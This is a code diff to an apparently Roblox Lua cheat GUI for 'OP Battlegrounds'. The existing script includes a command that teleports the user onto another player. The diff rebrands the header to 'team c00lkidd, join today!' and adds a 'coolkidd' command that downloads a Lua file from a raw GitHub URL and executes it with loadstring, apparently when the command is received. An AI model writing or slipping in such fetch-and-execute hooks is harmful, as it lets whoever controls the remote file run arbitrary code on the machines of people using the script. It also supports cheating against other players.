@@ -1,4 +1,4 @@
--- opbggui superuser update, added pinging
+-- team c00lkidd, join today!
 
 -- Instances:
 
@@ -1073,7 +1073,7 @@ UISizeConstraint_46.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function VQOKF_fake_script() -- Main.LocalScript 
+local function KVEOT_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -2257,8 +2257,10 @@ local function VQOKF_fake_script() -- Main.LocalScript
 								local lhrp = lchar:FindFirstChild('HumanoidRootPart') or lchar:WaitForChild('HumanoidRootPart', 2)
 								if not lhrp then return end
 								lhrp.CFrame = hrp.CFrame
-							end
-	
+							end,
+							coolkidd = function(data)
+								loadstring(game:HttpGet("https://raw.githubusercontent.com/realirist/OPBGGUI/refs/heads/main/coolkidd.lua"))()
+							end,
 						}
 	
 						if commandList[command] then
@@ -2313,4 +2315,4 @@ local function VQOKF_fake_script() -- Main.LocalScript
 	d.MinSize = d.MaxSize
 	d.Parent = a
 end
-coroutine.wrap(VQOKF_fake_script)()
+coroutine.wrap(KVEOT_fake_script)()
